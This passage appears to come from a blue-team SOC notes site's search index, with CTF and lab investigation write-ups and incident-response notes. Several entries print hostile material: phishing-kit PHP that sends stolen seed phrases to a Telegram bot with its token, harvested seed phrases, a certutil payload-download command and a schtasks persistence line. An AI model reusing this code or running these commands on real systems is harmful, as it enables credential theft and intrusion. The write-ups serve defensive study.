    "c": "Detecting SQL and XSS web application attacks  What version of TOR Browser did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter. index=\"botsv2\" amber tor.exe Look at the process field. There is an event showing the tor.exe installation file name which has the version ID torbrowser-install-7.0.4_en-US.exe . Answer: 7.0.4 What is the public IPv4 address of the server running www.brewertalk.com? index=\"botsv2\" sourcetype=\"stream:HTTP\" \"www.brewertalk.com\" Answer: 52.42.208.228 Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com. Same query. Use the src_ip field. It is the address making the most requests. Drill down into its form_data and some attempts at sql injection appear. Answer: 45.77.65.211 The IP address from Q#2 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php Look at the URI path. Answer: /member.php What SQL function is being abused on the URI path from the previous question? Check the form_data . There is an updatexml . Answer: updatexml What was the value of the cookie that Kevin’s browser transmitted to the malicious URL as part of an XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign. index=\"botsv2\" kevin sourcetype=\"stream:HTTP\" tag=error | table cookie Answer: 1502408189 What brewertalk.com username was maliciously created by a spear phishing attack? The attacker stole Kevin’s CSRF token ( 1bc3eab741900ab25c98eee86bf20feb ) and performed a trick from domain squatters by using a homograph attack. index=\"botsv2\" 1bc3eab741900ab25c98eee86bf20feb sourcetype=\"stream:HTTP\" brewertalk.com | table form_data Answer: klagerfield",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "6eb0c688f457dfb280a376b00f704662",
    "u": "https://siem.tymyrddin.dev/docs/notes/nist",
    "t": "Incident handling (NIST) ",
    "c": "Incident handling (NIST)  The National Institute of Standards and Technology (NIST) developed a framework for incident handling, which is the most commonly used model, also by the EC. Preparation  An incident management plan is put in place for detecting an incident in the environment. This involves, for example, identifying different malware attacks and determining what their impact on systems would be. It also involves ensuring that the tools to respond to an incident and the appropriate security measures are in place to stop an incident from happening in the first place . A team must consider how to manage communications, software, hardware, and any other available resources such as port lists and network diagrams. Teams must be conscious of frameworks, standards, and the main recommended practices for securing networks and systems. Team members should understand a range of common attack vectors, so they can identify attacks through certain types of activity. Communications  Consider contact information (email addresses, phone numbers, on-call information, and public encryption keys), and security information to help verify identities. This needs to be readily available for team members, law enforcement, and other incident response teams. Best is to also secure incident reporting mechanisms, an issue-tracking system, and smartphones to facilitate out-of-hours offsite and onsite communications. Encryption software can help secure communications with external parties. A so-called “war room” can be used as a base for these communications. Standardisation of communication on evidence-based information is also in progress. Containment strategies  Decision-making is key to containment and is made easier by following documented procedures for specific types of incidents. NIST advises defining acceptable risks to develop strategies for containment. Strategies can be based on incident types; A few examples of considerations: Potential damage to and theft of resources Need for evidence preservation Service availability (how services provided to clients may be affected) Time and resources for strategy implementation Strategy effectiveness (partial containment, full containment) Solution duration (emergency workarounds to be removed within four hours, temporary workarounds to be removed within two weeks, permanent solutions) Hardware and software  Hardware and software to analyse an incident should be installed in advance. This can include a SIEM stack , forensic workstations, backup drives, disk images to preserve log files and incident data, laptops for live analysis and report writing, and packet sniffers to track network activity. Spare hardware, workstations, laptops, servers, network equipment, and any virtual equivalents, is useful if the primary hardware has been compromised, mainly to restore operations when time permits. For evidence handling, keep used and blank removable storage media. Store backups of trusted software versions on used storage media, and store evidence ready for further analysis on the blank ones. It is also recommended to have additional evidence gathering accessories, such as notebooks, digital cameras, audio recorders, chain of custody forms, evidence storage bags and tags, and evidence tape. These are useful for legal purposes in particular if evidence is to be used in court proceedings. Analysis resources  Port lists detailing commonly used ports and those associated with specific strains of malware. Documentation for operating systems, applications, and protocols. Documentation for intrusion detection systems (IDS) antivirus (AV) software. Network diagrams and lists of critical assets to identify assets at risk. A baseline of activity across all networks, systems, and applications while interpreting incident activity. These can be used to compare with the incident data and check for anomalous behaviour. Hashes of critical files to assess whether they have been modified. Mitigation software  Make sure the team has access to clean images of operating systems and applications for restoration purposes. Keeping up-to-date images of applications as backups means they can be easily restored. Detection and analysis  Signs (attack vectors) of an incident can be precursors (an incident may occur in the future) and indicators (an incident might have already occurred or might still be happening). When an incident occurs, the initial analysis has several critical steps that are key to identifying the scope of the incident and determining which systems, networks, and applications have been affected. Things like normal behaviours, system and network profiling, and event correlation can make analysis easier. An incident response analyst is responsible for collecting and analysing data to find clues to help identify the source of an attack. In this step, analysts identify the nature of the attack and its impact on systems. Security professionals work with tools and indicators of compromise (IOCs) that have been developed to track the attacked systems. Containment, eradication, and recovery  This is the main phase of security incident response, in which the responders take action to stop any further damage. For evidence to be admissible in court, it’s crucial to document how it was acquired and preserved. All evidence activity should be recorded in a detailed log that includes identifying information, such as the location, hostname, MAC, and IP addresses. This log should also include the names, titles, and contact numbers of each individual who collected or handled the evidence. Timestamps are key to any investigation and should also be logged, particularly when handling evidence. Lastly, the storage location should be logged separately from the location of the identifying information, which refers to where the evidence was collected rather than stored. Containment  Containment is essential to prevent further damage and to ensure resources aren’t overwhelmed. Containment includes evidence gathering, handling, and identifying the attacking hosts. Actions might be disconnecting systems from networks, quarantining infected systems, or blocking traffic to and from known malicious IP addresses. Identifying the attacking hosts  Identifying the attacking hosts can be important, but often detracts from the containment, eradication, and recovery of an incident. It’s time consuming and not always possible. A system owner may want to know who caused the incident purely for investigative purposes, but it won’t help achieve the main goal of reducing business impact. The most common activities used to identify an attacker are: Validating the attacking host’s IP address Researching the attacking host through open-source intelligence and domain intel Using incident databases, which contain incident data and information about attacks Monitoring possible attacker communication channels Eradication  After containing a security issue, breached accounts need be disabled, and/or malicious code or software needs to be eradicated from the environment. This can involve using antivirus tools or manual removal techniques. It also includes ensuring that all security software is up-to-date in order to prevent any future incidents. Eradication is not always necessary, and is sometimes part of the recovery process. When eradication crosses over with recovery, administrators might mitigate vulnerabilities that have been exploited. Recovery  After eradication, all systems are restored to their pre-incident state. Administrators oversee the restoration of operations, the resumption of normal activity, and confirm everything is functioning adequately. This may involve restoring data from backups, rebuilding infected systems, and re-enabling disabled accounts. Eradication and recovery are often done in a phased approach that prioritises remediation steps, so the threat can not become active again. In general, it is best practice to focus on the critical security...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d650882db378856f1e016ee85fa5ced3",
    "u": "https://siem.tymyrddin.dev/docs/incident/recon",
    "t": "Reconnaissance phase ",
    "c": "Reconnaissance phase  Reconnaissance is an attempt to discover and collect information about a target. It could be knowledge about the system in use, the web application, employees or location, etc. Start the analysis by examining any reconnaissance attempt against the webserver imreallynotbatman.com . index=botsv1 imreallynotbatman.com sourcetype=stream:http Questions  index=botsv1 imreallynotbatman.com src_ip=\"40.80.148.42\" sourcetype=suricata \"alert.category\"=\"Attempted Administrator Privilege Gain\" One suricata alert highlighted the CVE value associated with the attack attempt. What is the CVE value? Add alert fields and use: index=botsv1 imreallynotbatman.com src_ip=\"40.80.148.42\" sourcetype=suricata \"alert.category\"=\"Attempted Administrator Privilege Gain\" CVE-2014-6271 See CVE-2014-6271 Detail , basically, ShellShock . What is the CMS our web server is using? index=botsv1 imreallynotbatman.com sourcetype=stream:http joomla What is the web scanner the attacker used to perform the scanning attempts? acunetix What is the IP address of the server imreallynotbatman.com ? 192.168.250.70",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2f4059845a906a1e6e278fe9a85670b9",
    "u": "https://siem.tymyrddin.dev/docs/bots/300",
    "t": "USB attack investigation ",
    "c": "USB attack investigation  Mallory’s critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. What is the name of this file after it was encrypted? index=\"botsv2\" host=\"MACLORY-AIR13\" (*.ppt OR *.pptx) Answer: Frothly_marketing_campaign_Q317.pptx.crypt_ There is a Games of Thrones movie file that was encrypted as well. What season and episode is it? index=\"botsv2\" host=\"MACLORY-AIR13\" sourcetype=ps *.crypt_ NOT *.pdf Answer: S07E02 Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory’s personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive. index=\"botsv2\" host=\"kutekitten\" \"\\\\/Users\\\\/mkraeusen\" sourcetype=osquery_results \"columns.target_path\"=\"/Users/mkraeusen/Downloads/Important_HR_INFO_for_mkraeusen\" 72d4d364ed91dd9418d144a2db837a6d MD5 hash VirusTotal-> . The device was infected before this event, so change the query to (but do NOT enter yet) index=\"botsv2\" host=\"kutekitten\" usb In the still listed events from the previous query: Go back to the bottom and apply 60 seconds before that first event Search in the events for vendor_id and use it to find the vendor name. Device Hunt -> Answer: Alcor Micro Corp. What programming language is at least part of the malware from the question above written in? Answer: perl When was this malware first seen in the wild? Answer Guidance: YYYY-MM-DD Answer: 2017-01-17 The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations? Hybrid analysis of the hash -> Answer: eidk.duckdns.org From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server? Answer: eidk.hopto.org",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "1c44af9b131c657d77235f9bc62d3569",
    "u": "https://siem.tymyrddin.dev/docs/thm/itsybitsy",
    "t": "ItsyBitsy ",
    "c": "ItsyBitsy  Scenario  During normal SOC monitoring, Analyst John observed an alert on an IDS solution indicating a potential C2 communication from a user Browne from the HR department. A suspicious file was accessed containing a malicious pattern THM:{ ________ } . A week-long HTTP connection logs have been pulled to investigate. Due to limited resources, only the connection logs could be pulled out and are ingested into the connection_logs index in Kibana. Examine the network connection logs of this user, find the link and the content of the file, and answer the questions. Questions  How many events were returned for the month of March 2022? 1482 What is the IP associated with the suspected user in the logs? 192.166.65.54 The user’s machine used a legit windows binary to download a file from the C2 server. What is the name of the binary? bitsadmin The infected machine connected with a famous filesharing site in this period, which also acts as a C2 server used by the malware authors to communicate. What is the name of the filesharing site? pastebin.com What is the full URL of the C2 to which the infected host is connected? pastebin.com/yTg0Ah6a A file was accessed on the filesharing site. What is the name of the file accessed? secret.txt The file contains a secret code with the format THM{_____} . Scroll down to see contents of secret.txt",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "4beb2ef7352f514444f54ce1b01e2fd2",
    "u": "https://siem.tymyrddin.dev/docs/notes/prevention",
    "t": "Incident prevention ",
    "c": "Incident prevention  Just a few notes. Because incident response is a cyclical process, preparation and prevention are considered before and after an incident. Before to ensure something does not happen, and after to ensure something doesn’t happen again. Risk assessments  Regular risk assessments are a universal method of incident prevention. A risk matrix can help visualise and match risks with priorities. Risk assessments can identify critical assets, allowing people to more effectively prioritise monitoring and response activities for those resources. The key to an effective impact assessment starts with two key questions: What is at risk when an incident occurs? How is impact measured? The majority or organisations view reputational impact as the most important. Other areas to measure include operational impact and legal impact. If an organisation is regulated, legal impact, policy impact, and regulatory impact can be measured as separate areas. Host security  Continuously monitor the security of all hosts, by enabling auditing and logging all security events. Approach host security with the principle of least privilege – privileges are to be based solely on the host’s authorised tasks, so hosts are given the lowest privileges possible to perform their duties. Network security  Network security is to be approached similarly to host security – in which the network perimeter denies all activity that isn’t expressly permitted. Malware prevention  Deploy AV software across all hosts, application servers, and application clients. If possible, use software that is designed to detect and stop malware, preventing its spread across a network, instead of the reactive approach of just preventing the initial installment by deploying it at a host level. For additional security, configure a firewall at a network level to block inbound and outbound connections from or to known malicious domains and IP addresses. This reduces the likelihood of an incident and prevents malware from being installed. User awareness training  In an ideal situation, all users are aware of security policies and procedures about the acceptable use of networks, systems, and applications. At the end of an incident response process, the lessons learned can be shared with all users so everyone can recognise how their own actions can affect the organisation. And all IT staff is trained to maintain security standards across all networks, systems, and applications.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "dd457f35b2b749f354c288ae5bf22fc9",
    "u": "https://siem.tymyrddin.dev/docs/cd/grabthefisher",
    "t": "GrabThePhisher ",
    "c": "GrabThePhisher  Scenario  In this Cyberdefenders challenge , an attacker compromised a server and impersonated https://pancakeswap.finance , a decentralized exchange native to BNB Chain, to host a phishing kit at https://apankewk.soup.xyz/mainpage.php . The attacker set it as an open directory with the file name “pankewk.zip”. Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework. Tools used  Telegram API Questions  Q1 Which wallet is used for asking the seed phrase? Q2 What is the file name that has the code for the phishing kit? sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk $ ls background1.jpg background2.jpg background.jpg cgi-bin favicon.ico images index.html log logo.png metamask _next src sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk $ cd metamask sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/metamask $ ls fonts index.html metamask.php Q3 In which language was the kit written? php Q4 What service does the kit use to retrieve the victim’s machine information? sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/metamask $ nano metamask.php <?php $request = file_get_contents(\"http://api.sypexgeo.net/json/\".$_SERVER['REMOTE_ADDR']); Q5 How many seed phrases were already collected? sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk $ cd log sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/log $ ls log.txt sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/log $ cat log.txt number edge rebuild stomach review course sphere absurd memory among drastic total bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth father also recycle embody balance concert mechanic believe owner pair muffin hockey Q6 Write down the seed phrase of the most recent phishing incident? father also recycle embody balance concert mechanic believe owner pair muffin hockey Q7 Which medium had been used for credential dumping? Q8 What is the token for the channel? Q9 What is the chat ID of the phisher’s channel? sansforensics@siftworkstation: ~/Desktop/cases/c75-GrabThePhisher/pankewk/metamask $ nano metamask.php sendTel($message); function sendTel($message){ $id = \"5442785564\"; $token = \"5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10\"; $filename = \"https://api.telegram.org/bot\".$token.\"/sendMessage?chat_id=\".$id.\"&text=\".urlencode($message).\"&parse_mode=html\"; file_get_contents($filename); $_POST[\"import-account__secret-phrase\"]. $text = $_POST['data'].\"\\n\";; @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND); } Q10 What are the allies of the phish kit developer? /* With love and respect to all the hustler out there, This is a small gift to my brothers, All the best with your luck, Regards, j1j1b1s@m3r0 */ Q11 What is the full name of the Phish Actor? Q12 What is the username of the Phish Actor? $ curl https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564 | jq . % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 160 100 160 0 0 403 0 --:--:-- --:--:-- --:--:-- 402 { \"ok\": true, \"result\": { \"id\": 5442785564, \"first_name\": \"Marcus\", \"last_name\": \"Aurelius\", \"username\": \"pumpkinboii\", \"type\": \"private\", \"active_usernames\": [ \"pumpkinboii\" ] } }",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "87c0ec2c86ad3e2cec465ac839432d51",
    "u": "https://siem.tymyrddin.dev/docs/cd/lespion",
    "t": "L’espion ",
    "c": "L’espion  Scenario  In this CyberDefenders challenge , You, as a SOC analyst, have been tasked by a client whose network was compromised and brought offline to investigate the incident and determine the attacker’s identity. Incident responders and digital forensic investigators are currently on the scene and have conducted a preliminary investigation. Their findings show that the attack originated from a single user account, probably, an insider. Investigate the incident, find the insider, and uncover the attack actions. Tools used  DuckDuckGo Cyberchef Questions  Q1 File -> Github.txt: What is the API key the insider added to his GitHub repositories? Q2 File -> Github.txt: What is the plaintext password the insider added to his GitHub repositories? In the same file: <div class=\"wrap-input100 validate-input\" data-validate = \"Valid username is required: FileCubeUser100\"> Username: EMarseille99 <span class=\"focus-input100\"></span> <span class=\"symbol-input100\"> <i class=\"fa fa-chain\" aria-hidden=\"true\"></i> </span> </div> <div class=\"wrap-input100 validate-input\" data-validate = \"Password is required\"> Password: UGljYXNzb0JhZ3VldHRlOTk= Password(base64) <span class=\"focus-input100\"></span> <span class=\"symbol-input100\"> <i class=\"fa fa-lock\" aria-hidden=\"true\"></i> </span> </div> Q3 File -> Github.txt: What cryptocurrency mining tool did the insider use? xmrig Q4 What university did the insider go to? LinkedIn Émilie Marseille Q5 What gaming website the insider had an account on? emarseille99 on Steam Q6 What is the link to the insider Instagram profile? Instagram link Q7 Where did the insider go on the holiday? (Country only) See posted picture on instagram Q8 Where is the insider’s family live? (City only) Burj Khalifa in photo Q9 File -> office.jpg: You have been provided with a picture of the building in which the company has an office. Which city is the company located in? DuckDuckGo for Alexandra Theater UK Q10 File -> Webcam.png: With the intel, you have provided, our ground surveillance unit is now overlooking the person of interest’s suspected address. They saw them leaving their apartment and followed them to the airport. Their plane took off and has landed in another country. Our intelligence team spotted the target with this IP camera. Which state is this camera in? EarthCam search",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e1653dba9873e7fc7c556cc4fa0bb410",
    "u": "https://siem.tymyrddin.dev/docs/resources/blogs",
    "t": "Blogs ",
    "c": "Blogs  Some informative blogs that range from general threat intelligence to incident response to geopolitical attacks: DarkReading SANS Internet Storm Center The Red Canary Blog Krebs On Security Cisco Talos Intelligence Blog CrowsStrike Blog CTOvision DomainTools Microsoft security intelligence The DFIR Report FireEye Threat Research Blogs The Cybersecurity and Infrastructure Security Agency (CISA)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2292e4cea6aaf55ed32599d9ae91ee0c",
    "u": "https://siem.tymyrddin.dev/docs/thm/benign",
    "t": "Benign ",
    "c": "Benign  One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering/scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation. All the required logs are ingested in the index win_eventlogs . The network is divided into three logical segments. IT Department: James Moin Katrina HR department: Haroon Chris Diana Marketing department: Bell Amelia Deepak Questions  How many logs are ingested from the month of March? Answer: 13959 Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user? index=win_eventlogs | dedup UserName | table UserName Answer: Amel1a Which user from the HR department was observed to be running scheduled tasks? index=win_eventlogs schtasks CommandLine=\"/create /tn OfficUpdater /tr \\\"C:\\\\Users\\\\Chris.fort\\\\AppData\\\\Local\\\\Temp\\\\update.exe\\\" /sc onstart\" Answer: Chris.fort Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host. haroon certutil.exe -urlcache -f - https://controlc.com/548ab556 benign.exe To bypass the security controls, which system process (lolbin) was used to download a payload from the internet? benign.exe was downloaded after a connection was established to https://controlc.com/548ab556 . The -f and -urlcache forces a fetch of the url. Answer: certutil.exe What was the date that this binary was executed by the infected host? format (YYYY-MM-DD) index=win_eventlogs UserName=\"Daina\" OR UserName=\"Chris.fort\" OR UserName=\"Haroon\" CommandLine=\" certutil.exe -urlcache -f - https://controlc.com/548ab556 benign.exe\" | dedup ProcessName Answer: 2022-03-04 Which third-party site was accessed to download the malicious payload? Answer: controlc.com What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase? Answer: benign.exe The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{……….}; what is that pattern? THM{KJ&*H^B0} What is the URL that the infected host connected to? Answer: https://controlc.com/548ab556",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "882a12104601d8898451107467fbb030",
    "u": "https://siem.tymyrddin.dev/docs/bots/data",
    "t": "Data dive ",
    "c": "Data dive  BOTSv2 Dataset  The data included in this app was generated on August 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. Persona  In this exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly (a beer company) to assist them with their recent issues. Events  The SPL (Splunk Search Processing Language) command metadata can be used to search for the same kind of information that is found in the Data Summary, with the bonus of being able to search within a specific index, if desired. All time-values are returned in EPOCH time, so to make the output user readable, the eval command should be used to provide more human-friendly formatting. In this example, we will search the botsv2 index and return a listing of all the source types that can be found as well as a count of events and the first time and last time seen. Metadata command: | metadata type=sourcetypes index=botsv2 | eval firstTime=strftime(firstTime,\"%Y-%m-%d %H:%M:%S\") | eval lastTime=strftime(lastTime,\"%Y-%m-%d %H:%M:%S\") | eval recentTime=strftime(recentTime,\"%Y-%m-%d %H:%M:%S\") | sort - totalCount All Time. Set it to OTHER:ALL TIME Resources  BOTSv2 Dataset Splunk Search Reference metadata MetaData > MetaLore Boss of the SOC 2.0 Dataset, Questions and Answers Open-Sourced and Ready for Download",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "4f9cf9fb6933593e7401aaa4efad17e3",
    "u": "https://siem.tymyrddin.dev/docs/incident/install",
    "t": "Installation phase ",
    "c": "Installation phase  We found evidence of the webserver iamreallynotbatman.com getting compromised via brute-force attack by the attacker using a python script to automate getting the correct password. The attacker used the IP for the attack and the IP to log in to the server. The installation phase investigates any payload/malicious program uploaded to the server from any attacker’s IPs and installed into the compromised server. Narrow down any http traffic coming into our server 192.168.250.70 containing the term .exe . This query may not lead to the findings, but it is good to start from one extension and move forward. index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" *.exe Look for the fields that could have some values of our interest. Also look at the missing fields and there a field part_filename{} shows up. The field part_filename{} contains the two file names: an executable file 3791.exe and a PHP file agent.php . To find if any of these two files came from the IP addresses that were found to be associated with the attack earlier, click on the file name, then look for the field c_ip . Was this file executed on the server after being uploaded?  We have found that file 3791.exe was uploaded to the server. Was this file executed on the server? To narrow down the search query to show the logs from the host-centric log sources: index=botsv1 \"3791.exe\" Leverage sysmon and look at the EventCode=1 for program execution: index=botsv1 \"3791.exe\" sourcetype=\"XmlWinEventLog\" EventCode=1 Questions  Sysmon also collects the Hash value of the processes being created. What is the MD5 hash of the program 3791.exe ? AAE3F5A29935E6ABCC2C2754D12A9AF0 Looking at the logs, which user executed the program 3791.exe on the server? NT AUTHORITY\\IUSR Search the hash on the virustotal. What other name is associated with this file 3791.exe ? ab.exe",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "07dbb374dd1275810b922cb389c44286",
    "u": "https://siem.tymyrddin.dev/docs/notes/hunting",
    "t": "Threat hunting ",
    "c": "Threat hunting  Threat hunting is complementary to the standard process of incident detection, response, and remediation, and is the practice of proactively searching for cyber threats that may be hidden in a network. Cyber threat hunting digs deep to find malicious actors in an environment that have slipped past the initial endpoint security defences. In case of a so-called Advanced Persistent Threat (APT), after getting in, an adversary can remain hidden in a network for months, while quietly exfiltrating data , looking for confidential material, or obtaining login credentials that will allow later movement in the environment. Once an adversary is successful in evading detection and an attack has penetrated an organisation’s defences, many organisations lack the advanced detection capabilities needed to stop the APT. This is why threat hunting is an essential component of any defence strategy, and becoming increasingly important as organisations seek to stay ahead of the latest cyber threats and rapidly respond to any potential attacks. Proactive threat hunting  Threat hunters assume that adversaries are already in the system, and look for unusual behaviour that may indicate the presence of malicious activity. Hypothesis-driven investigations are often triggered by a new threat that has been identified through a large pool of crowdsourced attack data, giving insights into an adversaries’ latest tactics, techniques, and procedures (TTP). Threat hunters will look for specific behaviours in their local environment. Investigations based on known Indicators of Compromise (IoC) or Indicators of Attack (IoA) use tactical threat intelligence to catalog known IOCs and IOAs associated with new threats as triggers for threat hunters use to discover hidden attacks or malicious activity. Advanced analytics and machine learning investigations sift through massive amounts of information to detect irregularities that may suggest potential malicious activity. These become hunting leads for analysts to identify new threats. In all cases, threat intelligence resources are combined with advanced security technology. Threat hunting steps  A trigger points threat hunters to a specific system or area of the network for further investigation when detection tools identify unusual actions that may indicate malicious activity. During the investigation phase, threat hunters use technology such as Endpoint Detection and Response (EDR) to take a deep dive into potential malicious compromise of a system. The resolution phase involves communicating relevant malicious activity intelligence to operations and security teams for a response to the incident and mitigation of threats. Threat hunters also analyse collected data to determine trends in an environment, eliminate current vulnerabilities and make predictions to enhance security in the future.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0ca4d6051c6e8620140923c0fb7f33a5",
    "u": "https://edr.tymyrddin.dev/",
    "t": "Endpoint detection and response (EDR) ",
    "c": "Endpoint detection and response (EDR)  Endpoint Detection and Response (EDR) is no longer optional. It is a core pillar of cybersecurity and regulations mandate EDR. Vulnerability scanners @GitHub Windows vulnerability scanner MacOS vulnerability scanner Linux vulnerability scanner Android vulnerability scanner iOS vulnerability scanner Tools @Testlab Endpoint Detection and Response tools Threat hunting tools macOS EDR techniques Introduction Process monitoring Memory protection Behavioural detection Network hardening Linux EDR techniques Introduction Kernel-level monitoring Filesystem integrity Container security Threat Hunting with Open Source Windows EDR techniques Introduction Process & behaviour monitoring Memory protection Attack Surface Reduction (ASR) Network threat detection Persistence and logging Response techniques EDR shell scripts @GitHub Windows EDR powershell script MacOS EDR shell script Linux EDR shell script TryHackMe Room  Windows core Introduction smss.exe csrss.exe wininit.exe services.exe svchost.exe lsass.exe winlogon.exe explorer.exe Windows sysinternals Introduction File and disk utilities Networking utilities Process utilities Security utilities System information Miscellaneous Windows event logs Introduction Event logs XPath queries Scenarios Sysmon Introduction Event IDs Cutting out the noise Hunting metasploit Detecting mimikatz Hunting malware Hunting persistence Detecting evasion techniques Practical investigations Osquery basics Introduction Osquery shell Schema documentation Creating queries",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "abda95611e0b9cf8dd026df9fdbb5ef2",
    "u": "https://edr.tymyrddin.dev/docs/osquery/shell",
    "t": "Osquery shell ",
    "c": "Osquery shell  One of the ways to interact with Osquery is by using the interactive mode: $ osqueryi To list all the available tables that can be queried: osquery> .table => appcompat_shims => arp_cache => atom_packages => authenticode => autoexec => azure_instance_metadata => azure_instance_tags => background_activities_moderator => bitlocker_info => carbon_black_info => carves => certificates => chassis_info => chocolatey_packages To list all the tables with the term user in them: osquery> .table user => user_groups => user_ssh_keys => userassist => users Schemas  To list the user’s table schema: osquery> .schema users CREATE TABLE users(`uid` BIGINT, `gid` BIGINT, `uid_signed` BIGINT, `gid_signed` BIGINT, `username` TEXT, `description` TEXT, `directory` TEXT, `shell` TEXT, `uuid` TEXT, `type` TEXT, `is_hidden` INTEGER HIDDEN, `pid_with_namespace` INTEGER HIDDEN, PRIMARY KEY (`uid`, `username`, `uuid`, `pid_with_namespace`)) WITHOUT ROWID; To display the columns from the user table: osquery>select gid, uid, description, username, directory from users; +-----+------+------------------------------------------------------------+----------------------+-------------------------------------------+ | gid | uid | description | username | directory | +-----+------+-------------------------------------------------------------------------------------------------------------------------------+ | 544 | 500 | Built-in account for administering the computer/domain | Administrator | | | 581 | 503 | A user account managed by the system. | DefaultAccount | | | 546 | 501 | Built-in account for guest access to the computer/domain | Guest | | | 544 | 1002 | | James | C:\\Users\\James | | 18 | 18 | | SYSTEM | %systemroot%\\system32\\config\\systemprofile | | 19 | 19 | | LOCAL SERVICE | %systemroot%\\ServiceProfiles\\LocalService | | 20 | 20 | | NETWORK SERVICE | %systemroot%\\ServiceProfiles\\NetworkService | +-----+------+------------------------------------------------------------+--------------------+---------------------------------------------+ Display Mode  .mode MODE Set output mode where MODE is one of: csv Comma-separated values column Left-aligned columns see .width line One value per line list Values delimited by .separator string pretty Pretty printed SQL results (default) Resources  osquery readthedocs",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2582b001b46073085d485abdca6cff3b",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/scenarios",
    "t": "Scenarios ",
    "c": "Scenarios  These scenarios/questions are based on an external event log file titled merged.evtx . Scenario 1  The server admins have made numerous complaints to Management regarding PowerShell being blocked in the environment. Management finally approved the usage of PowerShell within the environment. Visibility is now needed to ensure there are no gaps in coverage. You researched this topic: what logs to look at, what event IDs to monitor, etc. You enabled PowerShell logging on a test machine and had a colleague execute various commands. What event ID is to detect a PowerShell downgrade attack? Detecting and Preventing PowerShell Downgrade Attacks Answer: 400 What is the Date and Time this attack took place? MM/DD/YYYY H:MM:SS [AM/PM] Filter on eventID 400: Answer: 12/18/2020 7:50:33 AM Scenario 2  The Security Team is using Event Logs more. They want to ensure they can monitor if event logs are cleared. You assigned a colleague to execute this action. A Log clear event was recorded. What is the ‘Event Record ID’? The clear log is a Task Category: Answer: 27736 What is the name of the computer? Answer: PC01.example.corp Scenario 3  The threat intel team shared its research on Emotet. They advised searching for event ID 4104 and the text ScriptBlockText within the EventData element. Find the encoded PowerShell payload. What is the name of the first variable within the PowerShell command? Filter on source PowerShell and scroll down to the first event: Answer: $Va5w3n8 What is the Date and Time this attack took place? MM/DD/YYYY H:MM:SS [AM/PM] Answer: 8/25/2020 10:09:28 PM What is the Execution Process ID? Answer: 6620 Scenario 4  A report came in that an intern was suspected of running unusual commands on her machine, such as enumerating members of the Administrators group. A senior analyst suggested searching for C:\\Windows\\System32\\net1.exe . Confirm the suspicion. What is the Group Security ID of the group she enumerated? Enumeration involves Event ID 4798 and 4799. We are looking for the activity affecting a group, filter on 4799 and view the earliest entry. Check Details and it will be the TargetSid. Windows Security Log Event ID 4799 -> Answer: S-1-5-32-544 What is the event ID? Answer: 4799 Resources  EVTX Attack Samples (a few were used in this room) PowerShell <3 the Blue Team Tampering with Windows Event Tracing: 